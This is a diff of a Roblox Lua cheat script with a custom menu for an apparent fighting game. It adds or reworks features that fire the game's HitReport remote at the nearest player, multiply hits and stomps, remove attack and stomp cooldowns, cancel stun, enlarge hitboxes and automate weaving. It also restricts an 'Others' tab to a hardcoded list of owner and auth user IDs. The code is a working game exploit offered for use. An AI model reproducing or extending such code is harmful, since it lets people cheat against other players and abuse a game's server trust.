@@ -9,17 +9,25 @@ local CoreGui = game:GetService("CoreGui")
 
 local LocalPlayer = Players.LocalPlayer
 
--- people with an auth badge (custom name tag). Only they get the Others tab,
--- and only they see the hammer emblem.
 local AUTH_IDS = {
-	[10454681980] = true, -- Peace
-	[11812810326] = true, -- Seth
-	[11903709684] = true, -- Top 1
+	[10454681980] = true,
+	[11812810326] = true,
+	[11903709684] = true,
+	[10483824528] = true,
+}
+
+local OWNER_ID = 10483824528
+local IsOwner = LocalPlayer.UserId == OWNER_ID
+
+local AUTH_RANK = {
+	[10483824528] = 0,
+	[10454681980] = 1,
+	[11812810326] = 2,
+	[11903709684] = 3,
 }
 
 local IsAuthUser = AUTH_IDS[LocalPlayer.UserId] == true
 
--- cuts text to N characters without breaking emoji
 local function UTrunc(Text, Count)
 	local Ok, Pos = pcall(utf8.offset, Text, Count + 1)
 
@@ -46,9 +54,6 @@ local DIM = Color3.fromRGB(140, 142, 160)
 local ROW_BG = Color3.fromRGB(10, 10, 12)
 local ROW_TRANSP = 0.35
 
-------------------------------------------------------------------
--- saved config (feature toggles / sliders)
-------------------------------------------------------------------
 local CONFIG_FILE = "IsaevConfig.json"
 local Config = {}
 local SaveQueued = false
@@ -81,9 +86,6 @@ local function SaveConfig()
 	end)
 end
 
-------------------------------------------------------------------
--- helpers
-------------------------------------------------------------------
 local function New(class, props, parent)
 	local inst = Instance.new(class)
 	for k, v in pairs(props) do
@@ -106,9 +108,6 @@ local function IsPress(Input)
 		or Input.UserInputType == Enum.UserInputType.Touch
 end
 
-------------------------------------------------------------------
--- customizer settings (defaults are your chosen look)
-------------------------------------------------------------------
 local S = {
 	A1 = Color3.fromRGB(255, 255, 255),
 	A2 = Color3.fromRGB(160, 160, 170),
@@ -146,21 +145,21 @@ for k, v in pairs(S) do
 end
 
 local BgThemes = {
-	{ Color3.fromRGB(14, 12, 24), Color3.fromRGB(10, 10, 20), Color3.fromRGB(16, 10, 22) }, -- Midnight
-	{ Color3.fromRGB(4, 4, 6), Color3.fromRGB(2, 2, 4), Color3.fromRGB(6, 4, 8) }, -- Void (black)
-	{ Color3.fromRGB(8, 18, 36), Color3.fromRGB(6, 12, 28), Color3.fromRGB(10, 22, 40) }, -- Ocean
-	{ Color3.fromRGB(30, 8, 20), Color3.fromRGB(18, 6, 14), Color3.fromRGB(34, 10, 24) }, -- Wine
-	{ Color3.fromRGB(8, 26, 18), Color3.fromRGB(6, 16, 12), Color3.fromRGB(10, 30, 20) }, -- Forest
-	{ Color3.fromRGB(28, 30, 38), Color3.fromRGB(20, 22, 30), Color3.fromRGB(30, 30, 40) }, -- Slate
+	{ Color3.fromRGB(14, 12, 24), Color3.fromRGB(10, 10, 20), Color3.fromRGB(16, 10, 22) },
+	{ Color3.fromRGB(4, 4, 6), Color3.fromRGB(2, 2, 4), Color3.fromRGB(6, 4, 8) },
+	{ Color3.fromRGB(8, 18, 36), Color3.fromRGB(6, 12, 28), Color3.fromRGB(10, 22, 40) },
+	{ Color3.fromRGB(30, 8, 20), Color3.fromRGB(18, 6, 14), Color3.fromRGB(34, 10, 24) },
+	{ Color3.fromRGB(8, 26, 18), Color3.fromRGB(6, 16, 12), Color3.fromRGB(10, 30, 20) },
+	{ Color3.fromRGB(28, 30, 38), Color3.fromRGB(20, 22, 30), Color3.fromRGB(30, 30, 40) },
 }
 
 local AccentPresets = {
-	{ PURPLE, CYAN, PINK }, -- Neon
-	{ Color3.fromRGB(56, 189, 248), Color3.fromRGB(99, 102, 241), CYAN }, -- Ocean
-	{ Color3.fromRGB(251, 146, 60), Color3.fromRGB(244, 63, 94), YELLOW }, -- Sunset
-	{ Color3.fromRGB(132, 204, 22), CYAN, YELLOW }, -- Toxic
-	{ Color3.fromRGB(220, 38, 38), Color3.fromRGB(244, 63, 94), Color3.fromRGB(251, 146, 60) }, -- Blood
-	{ Color3.fromRGB(255, 255, 255), Color3.fromRGB(160, 160, 170), Color3.fromRGB(100, 100, 115) }, -- Mono (white)
+	{ PURPLE, CYAN, PINK },
+	{ Color3.fromRGB(56, 189, 248), Color3.fromRGB(99, 102, 241), CYAN },
+	{ Color3.fromRGB(251, 146, 60), Color3.fromRGB(244, 63, 94), YELLOW },
+	{ Color3.fromRGB(132, 204, 22), CYAN, YELLOW },
+	{ Color3.fromRGB(220, 38, 38), Color3.fromRGB(244, 63, 94), Color3.fromRGB(251, 146, 60) },
+	{ Color3.fromRGB(255, 255, 255), Color3.fromRGB(160, 160, 170), Color3.fromRGB(100, 100, 115) },
 }
 
 local TitleFonts = {
@@ -180,9 +179,6 @@ local RainbowSeq = ColorSequence.new({
 	KP(1, Color3.fromHSV(0, 0.7, 1)),
 })
 
-------------------------------------------------------------------
--- cleanup bookkeeping (re-running the script replaces the old one)
-------------------------------------------------------------------
 for _, Name in ipairs({ "IsaevUI2", "IsaevAutoWeaveUI", "IsaevAutoWeaveToggle", "IsaevHitbox", "IsaevCritBoostUI" }) do
 	local Old = CoreGui:FindFirstChild(Name)
 
@@ -212,9 +208,6 @@ local function RunSection(Fn)
 	end
 end
 
-------------------------------------------------------------------
--- window
-------------------------------------------------------------------
 local ScreenGui = New("ScreenGui", {
 	Name = "IsaevUI2",
 	ResetOnSpawn = false,
@@ -272,9 +265,6 @@ local Glow = New("Frame", {
 Corner(Glow, UDim.new(1, 0))
 local GlowGradient = New("UIGradient", { Rotation = 90 }, Glow)
 
-------------------------------------------------------------------
--- snow (behind everything: ZIndex 0)
-------------------------------------------------------------------
 local SnowLayer = New("Frame", {
 	Name = "Snow",
 	Size = UDim2.new(1, 0, 1, 0),
@@ -308,9 +298,6 @@ for i = 1, MAX_FLAKES do
 	}
 end
 
-------------------------------------------------------------------
--- header
-------------------------------------------------------------------
 local Header = New("Frame", {
 	Size = UDim2.new(1, 0, 0, 108),
 	BackgroundTransparency = 1,
@@ -376,9 +363,6 @@ local DividerGradient = New("UIGradient", {
 	}),
 }, Divider)
 
-------------------------------------------------------------------
--- rail (tabs) + card (pages)  -- no gray outlines
-------------------------------------------------------------------
 local Rail = New("ScrollingFrame", {
 	Size = UDim2.new(0, 56, 1, -140),
 	Position = UDim2.new(0, 14, 0, 128),
@@ -432,18 +416,18 @@ local function MakePage()
 end
 
 local CombatPage = MakePage()
+local KaPage = MakePage()
 local WeavePage = MakePage()
 local MiscPage = MakePage()
 local FlingPage = MakePage()
 local SettingsPage = MakePage()
 local ConfigsPage = MakePage()
-local OthersPage = MakePage() -- only shown (tab added) for auth users
+local OthersPage = MakePage()
 local Custom = MakePage()
 
-local Pages = { CombatPage, WeavePage, MiscPage, FlingPage, SettingsPage, ConfigsPage }
-local TabIcons = { "⚔️", "☁️", "⚡", "🎖️", "⚙️", "💾" }
+local Pages = { CombatPage, KaPage, WeavePage, MiscPage, FlingPage, SettingsPage, ConfigsPage }
+local TabIcons = { "⚔️", "👿", "☁️", "⚡", "🎖️", "⚙️", "💾" }
 
--- the Others tab (list of everyone using the script + join) is for auth badge people only
 if IsAuthUser then
 	table.insert(Pages, OthersPage)
 	table.insert(TabIcons, "👥")
@@ -452,7 +436,6 @@ end
 table.insert(Pages, Custom)
 table.insert(TabIcons, "🎨")
 
--- resize handle: bottom-right corner (invisible, but it still works)
 local Grip = New("TextButton", {
 	Size = UDim2.new(0, 26, 0, 26),
 	AnchorPoint = Vector2.new(1, 1),
@@ -463,12 +446,9 @@ local Grip = New("TextButton", {
 	ZIndex = 10,
 }, Main)
 
-------------------------------------------------------------------
--- tabs
-------------------------------------------------------------------
 local Refreshers = {}
 local OpenDone = false
-local Selected = 2
+local Selected = 3
 local Tabs = {}
 local Apply
 
@@ -513,9 +493,6 @@ for i = 1, #Pages do
 	Tabs[i] = { dot = Dot, stroke = Stroke }
 end
 
-------------------------------------------------------------------
--- snow helpers + apply (pushes every customizer setting onto the UI)
-------------------------------------------------------------------
 local function SnowCol()
 	if S.SnowColor == "Ice" then
 		return Color3.fromRGB(170, 225, 255)
@@ -604,9 +581,6 @@ Apply = function()
 	end
 end
 
-------------------------------------------------------------------
--- shared row builders
-------------------------------------------------------------------
 local ActiveSlider = nil
 local FeatureControls = {}
 
@@ -727,7 +701,6 @@ local function MakeSlider(Parent, Text, Min, Max, Step, Get, Set, After, Boxed)
 	return Row, Show
 end
 
--- feature toggle (saved in config, runs a callback)
 local function CreateToggle(Parent, Text, Default, Callback, Key, Locked)
 	local Initial = Default
 
@@ -850,7 +823,6 @@ local function CreateToggle(Parent, Text, Default, Callback, Key, Locked)
 	return Holder
 end
 
--- feature slider (saved in config, runs a callback)
 local function CreateSlider(Parent, Text, Min, Max, Step, Default, Callback, Key)
 	if Key and type(Config[Key]) == "number" then
 		Default = math.clamp(Config[Key], Min, Max)
@@ -904,9 +876,6 @@ local function CreateSlider(Parent, Text, Min, Max, Step, Default, Callback, Key
 	return Row
 end
 
-------------------------------------------------------------------
--- game modules (shared by weave / combat sections)
-------------------------------------------------------------------
 local Modules = {}
 
 local function LoadModules()
@@ -952,9 +921,6 @@ local function IsAlive()
 	return Humanoid ~= nil and Humanoid.Health > 0
 end
 
-------------------------------------------------------------------
--- moving gradient text (discord style): the colours slide along the word
-------------------------------------------------------------------
 local Anim = { Items = {} }
 local AnimClock = 0
 
@@ -990,18 +956,13 @@ Conn(RunService.Heartbeat:Connect(function(dt)
 	end
 end))
 
-------------------------------------------------------------------
--- SECTION: custom name tags (replaces the old king outlines)
--- Peace = black -> blue, Seth = white -> blue.
--- Their real name and any old badge above the head is hidden for you.
-------------------------------------------------------------------
 RunSection(function()
-	-- font used by the Peace / Seth name tags
+
 	local TAG_FONT = Enum.Font.GothamBlack
 
 	local TAGS = {
 		[10454681980] = {
-			Text = "P\u{2009}e\u{2009}a\u{2009}c\u{2009}e", -- thin gap between the letters
+			Text = "P\u{2009}e\u{2009}a\u{2009}c\u{2009}e",
 			Colors = {
 				Color3.fromRGB(30, 70, 200),
 				Color3.fromRGB(70, 150, 255),
@@ -1024,7 +985,7 @@ RunSection(function()
 			Stroke = Color3.fromRGB(12, 24, 60),
 			Speed = 0.22,
 		},
-		-- plain cosmetic tag only (no commands, perms or roles)
+
 		[11903709684] = {
 			Text = "Top 1",
 			Colors = {
@@ -1043,7 +1004,7 @@ RunSection(function()
 	}
 
 	local TAG_NAME = "IsaevNameTag"
-	local State = {} -- [Player] = { Gui, Humanoid, OldDisplay, Hidden = { [BillboardGui] = oldEnabled } }
+	local State = {}
 
 	local function Restore(Player)
 		local Data = State[Player]
@@ -1113,7 +1074,6 @@ RunSection(function()
 		return Gui
 	end
 
-	-- hides the default name and any other billboard (old badges) above the head
 	local function Sweep(Player)
 		local Data = State[Player]
 		local Character = Player.Character
@@ -1190,7 +1150,6 @@ RunSection(function()
 	Conn(Players.PlayerAdded:Connect(Watch))
 	Conn(Players.PlayerRemoving:Connect(Restore))
 
-	-- keep the real name / old badges hidden if the game brings them back
 	local Last = 0
 
 	Conn(RunService.Heartbeat:Connect(function()
@@ -1216,11 +1175,9 @@ RunSection(function()
 	end)
 end)
 
-------------------------------------------------------------------
--- SECTION: weave
-------------------------------------------------------------------
 RunSection(function()
 	local AutoEnabled = false
+	local AutoWeaveOn = false
 	local DashEnabled = false
 	local DashDistance = 2.2
 	local WeaveSlideOn = false
@@ -1269,10 +1226,12 @@ RunSection(function()
 		local Character = LocalPlayer.Character
 		local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
 
-		if Humanoid and not (AutoEnabled and Weaving) and not WeaveBusy then
+		if Humanoid and not ((AutoEnabled or AutoWeaveOn) and Weaving) and not WeaveBusy then
 			Humanoid.WalkSpeed = WalkSpeedDefault
 		end
 	end
+
+	local BlockRefs = 0
 
 	local function BlockGameWeave()
 		if Blocked or SpaceBound or not Modules.Weave then
@@ -1334,6 +1293,22 @@ RunSection(function()
 		if SpaceBound then
 			SpaceBound = false
 			ContextActionService:UnbindAction("IsaevBlockSpace")
+		end
+	end
+
+	local function AcquireBlock()
+		BlockRefs += 1
+
+		if BlockRefs == 1 then
+			BlockGameWeave()
+		end
+	end
+
+	local function ReleaseBlock()
+		BlockRefs = math.max(0, BlockRefs - 1)
+
+		if BlockRefs == 0 then
+			UnblockGameWeave()
 		end
 	end
 
@@ -1635,7 +1610,6 @@ RunSection(function()
 		StopOwnTrack()
 	end
 
-	-- unequipping the fist shuts weave off completely
 	local ToolConn = nil
 
 	local function WatchTools(Character)
@@ -1649,7 +1623,7 @@ RunSection(function()
 		end
 
 		ToolConn = Character.ChildRemoved:Connect(function(Child)
-			if Child.Name == "Fight" and AutoEnabled then
+			if Child.Name == "Fight" and (AutoEnabled or AutoWeaveOn) then
 				ClearInputSources()
 				StopWeave()
 			end
@@ -1657,7 +1631,7 @@ RunSection(function()
 	end
 
 	local function Tick()
-		if not AutoEnabled or not Modules.Combat then
+		if not (AutoEnabled or AutoWeaveOn) or not Modules.Combat then
 			return
 		end
 
@@ -1699,12 +1673,22 @@ RunSection(function()
 
 		local Moving = Humanoid.MoveDirection.Magnitude > 0.05
 
-		local WantWeave = SpaceHeld and Moving
+		local Animating = SpaceHeld and Moving
+		local WantWeave = AutoWeaveOn or Animating
 
 		if WantWeave then
-			if not Weaving then
-				Weaving = true
-				LastDashDirection = nil
+			if Animating then
+				if not Weaving then
+					Weaving = true
+					LastDashDirection = nil
+				end
+			else
+				if Weaving then
+					Weaving = false
+					LastDashDirection = nil
+				end
+
+				StopOwnTrack()
 			end
 
 			if not SignalOn then
@@ -1714,7 +1698,9 @@ RunSection(function()
 			SignalOn = true
 			LingerUntil = nil
 
-			UpdateWeave()
+			if Animating then
+				UpdateWeave()
+			end
 		elseif Weaving then
 			Weaving = false
 			LastDashDirection = nil
@@ -1795,7 +1781,7 @@ RunSection(function()
 			return
 		end
 
-		local Running = AutoEnabled and Weaving and HasFight()
+		local Running = (AutoEnabled or AutoWeaveOn) and Weaving and HasFight()
 
 		if Running and not WeaveSlideOn then
 			if not LockedSpeed and Humanoid.WalkSpeed > 0 then
@@ -1873,7 +1859,7 @@ RunSection(function()
 			return
 		end
 
-		if (AutoEnabled and Weaving) or WeaveBusy then
+		if ((AutoEnabled or AutoWeaveOn) and Weaving) or WeaveBusy then
 			return
 		end
 
@@ -1886,7 +1872,7 @@ RunSection(function()
 	end))
 
 	Conn(UserInputService.InputBegan:Connect(function(Input)
-		if not AutoEnabled then
+		if not (AutoEnabled or AutoWeaveOn) then
 			return
 		end
 
@@ -1939,11 +1925,11 @@ RunSection(function()
 		end)
 
 		AutoEnabled = false
+		AutoWeaveOn = false
 		StopWeave()
 		UnblockGameWeave()
 	end)
 
-	-- weave-slide system (keeps your speed capped while weaving)
 	do
 		local WEAVE_IDS = {
 			["18312351760"] = true,
@@ -2089,22 +2075,25 @@ RunSection(function()
 			end
 		end))
 
-		-- controls (weave tab)
 		local AutoToggle = CreateToggle(WeavePage, "Weave", false, function(State)
 			AutoEnabled = State
 
 			if State then
 				task.spawn(function()
 					if LoadModules() and AutoEnabled then
-						BlockGameWeave()
+						AcquireBlock()
 					end
 
 					HookGameInput()
 				end)
 			else
 				ClearInputSources()
-				StopWeave()
-				UnblockGameWeave()
+
+				if not AutoWeaveOn then
+					StopWeave()
+				end
+
+				ReleaseBlock()
 			end
 		end, "Weave")
 		AutoToggle.LayoutOrder = 1
@@ -2141,7 +2130,6 @@ RunSection(function()
 		end, "TurnOffDelay")
 		DelaySlider.LayoutOrder = 6
 
-		-- walk speed is OFF every time the script loads
 		local WalkToggle = CreateToggle(WeavePage, "Walk Speed", false, function(State)
 			local WasCustom = WalkSpeedCustom()
 			WalkSpeedOn = State
@@ -2163,11 +2151,28 @@ RunSection(function()
 		end, "WalkSpeed")
 		WalkSlider.LayoutOrder = 8
 	end
+
+	local AutoWeaveToggle = CreateToggle(WeavePage, "Autoweave", false, function(State)
+		AutoWeaveOn = State
+
+		if State then
+			task.spawn(function()
+				if LoadModules() and AutoWeaveOn then
+					AcquireBlock()
+				end
+			end)
+		else
+			if not AutoEnabled then
+				ClearInputSources()
+				StopWeave()
+			end
+
+			ReleaseBlock()
+		end
+	end, "AutoWeave")
+	AutoWeaveToggle.LayoutOrder = 9
 end)
 
-------------------------------------------------------------------
--- SECTION: hitbox
-------------------------------------------------------------------
 RunSection(function()
 	local HitboxOn = false
 	local Range = 7
@@ -2437,9 +2442,6 @@ RunSection(function()
 	TransparencySlider.LayoutOrder = 5
 end)
 
-------------------------------------------------------------------
--- SECTION: combat extras (connect / no delay / anti stun / speeds)
-------------------------------------------------------------------
 RunSection(function()
 	local NoDelayOn = false
 	local PunchGap = 0.1
@@ -2466,8 +2468,6 @@ RunSection(function()
 
 	task.spawn(LoadAttackState)
 
-	-- no attack delay: frees CanAttack after the punch delay, always.
-	-- shove / slam / heavy / stomp / weave no longer pause it.
 	local LastCanAttack = true
 	local LockStartedAt = 0
 	local LastLoadTry = 0
@@ -2520,7 +2520,6 @@ RunSection(function()
 		end)
 	end))
 
-	-- anti stun
 	local AntiStunOn = false
 	local BaseSpeeds = setmetatable({}, { __mode = "k" })
 
@@ -2553,7 +2552,6 @@ RunSection(function()
 		end)
 	end))
 
-	-- punch / stomp animation speed
 	local PUNCH_IDS = {
 		"18312333191", "18312335714", "18312338197", "18312340119",
 		"17819438450", "17819441388", "17819444004", "17819446225",
@@ -2632,7 +2630,6 @@ RunSection(function()
 		end
 	end))
 
-	-- controls (combat tab)
 	local NoDelayToggle = CreateToggle(CombatPage, "No Attack Delay", false, function(State)
 		NoDelayOn = State
 
@@ -2667,24 +2664,19 @@ RunSection(function()
 	StompSpeedSlider.LayoutOrder = 12
 end)
 
-------------------------------------------------------------------
--- SECTION: auto connect / no stomp delay / easy stomp
-------------------------------------------------------------------
 RunSection(function()
-	-- Auto Connect normally reuses the game's own swing number for the hit.
-	-- If hits don't register on your end, set this to true: it sends its own
-	-- swing + hit instead (same method as the Easy Hit feature).
-	local USE_OWN_SWING = false
+
+	local LastConnectedSeq = { Attack = nil, Stomp = nil }
 
 	local ConnectOn = false
 	local ConnectRange = 8
 
 	local NoStompOn = false
-	local StompGap = 0
+	local StompGap = 0.02
 
 	local EasyStompOn = false
 	local EasyStompCount = 1
-	local EasyStompReach = 7
+	local EasyStompReach = 8
 
 	local LastLoadTry = 0
 
@@ -2703,12 +2695,6 @@ RunSection(function()
 		return false
 	end
 
-	----------------------------------------------------------------
-	-- AUTO CONNECT
-	-- When one of your punches or stomps reaches its hit window, the
-	-- nearest player inside the range gets hit-reported on that swing,
-	-- using whichever hand (or foot, for stomps) is closest to them.
-	----------------------------------------------------------------
 	local function NearestTarget(Range)
 		local Character = LocalPlayer.Character
 		local Root = Character and Character:FindFirstChild("HumanoidRootPart")
@@ -2783,7 +2769,6 @@ RunSection(function()
 		return Best or Character:FindFirstChild("HumanoidRootPart")
 	end
 
-	-- Kind is "Attack" (punch) or "Stomp"
 	local function ReportHit(Action, Kind)
 		local Active = Modules.AttackState and Modules.AttackState.Active
 		local Combat = Modules.Combat
@@ -2796,6 +2781,16 @@ RunSection(function()
 		local Current = Kind == "Stomp" and Active.CurrentAction or Active.CurrentM1
 
 		if Current ~= Action then
+			return
+		end
+
+		local StillPlaying = false
+
+		pcall(function()
+			StillPlaying = Action.IsPlaying
+		end)
+
+		if not StillPlaying then
 			return
 		end
 
@@ -2821,28 +2816,41 @@ RunSection(function()
 
 		local Seq = Active.Seq
 
-		if USE_OWN_SWING then
-			Active.Seq = (Active.Seq or 0) + 1
-			Seq = Active.Seq
-
-			pcall(function()
-				Combat.Swing:Fire(Seq, Kind, Limb.Name == "LeftHand" and "LeftHand" or "RightHand")
-			end)
-
-			task.wait(0.04)
-
-			if not TargetPart.Parent then
-				return
-			end
-		end
-
-		if type(Seq) ~= "number" then
+		if type(Seq) ~= "number" or LastConnectedSeq[Kind] == Seq then
 			return
 		end
+
+		LastConnectedSeq[Kind] = Seq
 
 		pcall(function()
 			Combat.HitReport:Fire(Seq, TargetPart, Limb.Position)
 		end)
+	end
+
+	local LastAttackInputAt = -100
+	local AttackInputHooked = false
+
+	Conn(UserInputService.InputBegan:Connect(function(Input)
+		if Input.UserInputType == Enum.UserInputType.MouseButton1
+			or Input.UserInputType == Enum.UserInputType.Touch
+			or Input.KeyCode == Enum.KeyCode.ButtonR2 then
+			LastAttackInputAt = os.clock()
+		end
+	end))
+
+	local function AttackInputRecent()
+		if os.clock() - LastAttackInputAt <= 0.6 then
+			return true
+		end
+
+		local Held = false
+
+		pcall(function()
+			Held = UserInputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton1)
+				or UserInputService:IsGamepadButtonDown(Enum.UserInputType.Gamepad1, Enum.KeyCode.ButtonR2)
+		end)
+
+		return Held
 	end
 
 	local ActionTokens = { Attack = 0, Stomp = 0 }
@@ -2889,6 +2897,18 @@ RunSection(function()
 			return
 		end
 
+		if not AttackInputHooked and Modules.Input then
+			AttackInputHooked = true
+
+			pcall(function()
+				Modules.Input.Began:Connect(function(Action)
+					if Action == "Attack" then
+						LastAttackInputAt = os.clock()
+					end
+				end)
+			end)
+		end
+
 		local Active = Modules.AttackState.Active
 		local M1 = Active and Active.CurrentM1
 
@@ -2910,32 +2930,22 @@ RunSection(function()
 
 		if Playing and (M1 ~= LastM1 or Restarted) then
 			LastM1 = M1
-			OnAction(M1, "Attack")
+
+			if AttackInputRecent() then
+				OnAction(M1, "Attack")
+			end
 		elseif not Playing then
 			LastM1 = nil
 		end
 	end))
 
-	----------------------------------------------------------------
-	-- EASY STOMP  (same idea as Easy Hit, but for stomps)
-	-- When a stomp starts, an extra stomp swing + hit report is sent
-	-- on the nearest player inside reach.
-	----------------------------------------------------------------
-	local EasyStompBusy = false
-
-	local function SendStompHit()
+	local function SendStompHit(Model)
 		local Active = Modules.AttackState and Modules.AttackState.Active
 		local Combat = Modules.Combat
 		local Character = LocalPlayer.Character
 
 		if not Active or not Combat or not Character or not IsAlive() then
-			return false
-		end
-
-		local Model = NearestTarget(EasyStompReach)
-
-		if not Model then
-			return false
+			return
 		end
 
 		local Target = Model:FindFirstChild("UpperTorso")
@@ -2943,7 +2953,7 @@ RunSection(function()
 			or Model:FindFirstChild("HumanoidRootPart")
 
 		if not Target then
-			return false
+			return
 		end
 
 		local Foot = ClosestLimb(Character, FOOT_PARTS, Target.Position)
@@ -2963,61 +2973,55 @@ RunSection(function()
 				Combat.HitReport:Fire(Seq, Target, Foot.Position)
 			end)
 		end
-
-		return true
 	end
 
-	local function EasyStompFire()
-		if not EasyStompOn or EasyStompBusy then
+	local function StompMultiFire()
+		if not EasyStompOn or not IsAlive() or not HasFight() then
 			return
 		end
 
-		EasyStompBusy = true
+		local Model = NearestTarget(EasyStompReach)
 
-		task.spawn(function()
-			task.wait(0)
+		if not Model then
+			return
+		end
 
-			for Index = 1, EasyStompCount do
-				if not EasyStompOn or not IsAlive() or not HasFight() then
-					break
-				end
-
-				SendStompHit()
-
-				if Index < EasyStompCount then
-					task.wait(0)
-				end
-			end
-
-			EasyStompBusy = false
-		end)
+		for _ = 1, EasyStompCount do
+			task.spawn(SendStompHit, Model)
+		end
 	end
 
-	----------------------------------------------------------------
-	-- stomp watcher: drives Auto Connect (stomps), Easy Stomp and
-	-- NO STOMP DELAY.
-	-- No Stomp Delay frees the stomp lock the moment a stomp starts
-	-- (after Stomp Gap, which is 0 by default) and keeps it free
-	-- while the animation plays, so you can stomp again instantly.
-	-- The animation itself is not cancelled.
-	----------------------------------------------------------------
 	local LastStomping = false
-	local StompStartedAt = 0
+	local StompStartedAt = -100
+	local StompSwingAt = nil
+	local StompMultiDone = true
+	local StompMarker = nil
+
+	local function OnStompSwing()
+		if not StompSwingAt then
+			StompSwingAt = os.clock()
+		end
+
+		if not StompMultiDone then
+			StompMultiDone = true
+			StompMultiFire()
+		end
+	end
 
 	Conn(RunService.Heartbeat:Connect(function()
-		if not NoStompOn and not ConnectOn and not EasyStompOn then
+		if not NoStompOn and not EasyStompOn then
 			LastStomping = false
 			return
 		end
 
-		local AttackState = Modules.AttackState
+		local AttackStateModule = Modules.AttackState
 
-		if not AttackState then
+		if not AttackStateModule then
 			EnsureModules()
 			return
 		end
 
-		local Active = AttackState.Active
+		local Active = AttackStateModule.Active
 
 		if not Active then
 			return
@@ -3028,38 +3032,42 @@ RunSection(function()
 		local Started = Stomping and not LastStomping
 		LastStomping = Stomping
 
-		if Started and Active.CurrentKind == "Stomp" and Active.CurrentAction then
+		if Started and Active.CurrentKind == "Stomp" then
 			StompStartedAt = Now
+			StompSwingAt = nil
+			StompMultiDone = not EasyStompOn
 
-			if ConnectOn then
-				OnAction(Active.CurrentAction, "Stomp")
+			if StompMarker then
+				StompMarker:Disconnect()
+				StompMarker = nil
 			end
 
-			if EasyStompOn then
-				EasyStompFire()
-			end
+			pcall(function()
+				if Active.CurrentAction then
+					StompMarker = Active.CurrentAction:GetMarkerReachedSignal("Start"):Connect(function()
+						if StompMarker then
+							StompMarker:Disconnect()
+							StompMarker = nil
+						end
+
+						OnStompSwing()
+					end)
+				end
+			end)
 		end
 
-		if NoStompOn and Active.CurrentKind == "Stomp" and Now - StompStartedAt >= StompGap then
-			local Track = Active.CurrentAction
-			local Playing = false
+		if Stomping and not StompSwingAt and Now - StompStartedAt >= 0.34 then
+			OnStompSwing()
+		end
 
-			if Track then
-				pcall(function()
-					Playing = Track.IsPlaying
-				end)
-			end
-
-			if Playing then
-				Active.CanAttack = true
-				Active.Stomping = false
-			end
+		if NoStompOn and Stomping and StompSwingAt and Now - StompSwingAt >= StompGap then
+			Active.CanAttack = true
+			Active.Stomping = false
+			StompSwingAt = nil
+			LastStomping = false
 		end
 	end))
 
-	----------------------------------------------------------------
-	-- controls (combat tab)
-	----------------------------------------------------------------
 	local ConnectToggle = CreateToggle(CombatPage, "Auto Connect", false, function(State)
 		ConnectOn = State
 
@@ -3069,7 +3077,7 @@ RunSection(function()
 	end, "AutoConnect")
 	ConnectToggle.LayoutOrder = 1
 
-	local ConnectSlider = CreateSlider(CombatPage, "Connect Range", 2, 25, 0.5, 8, function(Value)
+	local ConnectSlider = CreateSlider(CombatPage, "Connect Range", 2, 17, 0.1, 8, function(Value)
 		ConnectRange = Value
 	end, "ConnectRange")
 	ConnectSlider.LayoutOrder = 2
@@ -3083,12 +3091,12 @@ RunSection(function()
 	end, "NoStompDelay")
 	NoStompToggle.LayoutOrder = 8
 
-	local StompGapSlider = CreateSlider(CombatPage, "Stomp Gap", 0, 1, 0.01, 0, function(Value)
+	local StompGapSlider = CreateSlider(CombatPage, "Stomp Gap", 0, 1, 0.01, 0.02, function(Value)
 		StompGap = Value
 	end, "StompGap")
 	StompGapSlider.LayoutOrder = 9
 
-	local EasyStompToggle = CreateToggle(CombatPage, "Easy Stomp", false, function(State)
+	local EasyStompToggle = CreateToggle(KaPage, "Stomp Multi", false, function(State)
 		EasyStompOn = State
 
 		if State then
@@ -3097,15 +3105,12 @@ RunSection(function()
 	end, "EasyStomp")
 	EasyStompToggle.LayoutOrder = 16
 
-	local EasyStompSlider = CreateSlider(CombatPage, "Easy Stomps", 1, 5, 1, 1, function(Value)
+	local EasyStompSlider = CreateSlider(KaPage, "Stomp Multi Amount", 1, 7, 1, 1, function(Value)
 		EasyStompCount = Value
 	end, "EasyStomps")
 	EasyStompSlider.LayoutOrder = 17
 end)
 
-------------------------------------------------------------------
--- SECTION: crit boost / easy hit (bottom of combat tab)
-------------------------------------------------------------------
 RunSection(function()
 	local CritOn = false
 	local EasyOn = false
@@ -3115,7 +3120,6 @@ RunSection(function()
 	local EasyDelay = 0
 	local EasySpacing = 0
 	local HeavyCooldown = 5.5
-	local HeavyQuietTime = 1
 	local Reach = 7
 
 	local LastM1 = nil
@@ -3221,29 +3225,14 @@ RunSection(function()
 			return
 		end
 
-		LastHeavyAt = Now
-
 		local Active = Modules.AttackState and Modules.AttackState.Active
 
 		if Active and (Active.Weaving or Active.Shoving or Active.Slamming or Active.Stomping) then
 			return
 		end
 
-		task.spawn(function()
-			pcall(function()
-				Modules.Combat.Sprint:Fire(true)
-			end)
-
-			task.wait(0.1)
-
-			pcall(function()
-				Modules.Combat.Sprint:Fire(false)
-			end)
-
-			task.wait(0.18)
-
-			SendHit("Heavy", "RightHand")
-		end)
+		LastHeavyAt = Now
+		SendHit("Heavy", "RightHand")
 	end
 
 	local function EasyFire()
@@ -3258,10 +3247,6 @@ RunSection(function()
 
 			for Index = 1, EasyCount do
 				if not EasyOn or not IsAlive() or not HasFight() then
-					break
-				end
-
-				if os.clock() - LastHeavyAt < HeavyQuietTime then
 					break
 				end
 
@@ -3301,7 +3286,11 @@ RunSection(function()
 			LastM1 = M1
 
 			if CritOn then
-				task.delay(CritDelay, FireHeavy)
+				if CritDelay > 0 then
+					task.delay(CritDelay, FireHeavy)
+				else
+					FireHeavy()
+				end
 			end
 
 			if EasyOn then
@@ -3312,7 +3301,7 @@ RunSection(function()
 		end
 	end))
 
-	local CritToggle = CreateToggle(CombatPage, "Crit Boost", false, function(State)
+	local CritToggle = CreateToggle(KaPage, "Crit Boost", false, function(State)
 		CritOn = State
 		LastM1 = nil
 
@@ -3322,7 +3311,7 @@ RunSection(function()
 	end, "CritBoost")
 	CritToggle.LayoutOrder = 13
 
-	local EasyToggle = CreateToggle(CombatPage, "Easy Hit", false, function(State)
+	local EasyToggle = CreateToggle(KaPage, "Hit Multi", false, function(State)
 		EasyOn = State
 		LastM1 = nil
 
@@ -3332,15 +3321,253 @@ RunSection(function()
 	end, "EasyHit")
 	EasyToggle.LayoutOrder = 14
 
-	local EasySlider = CreateSlider(CombatPage, "Easy Hits", 1, 5, 1, 1, function(Value)
+	local EasySlider = CreateSlider(KaPage, "Hit Multi Amount", 1, 5, 1, 1, function(Value)
 		EasyCount = Value
 	end, "EasyHits")
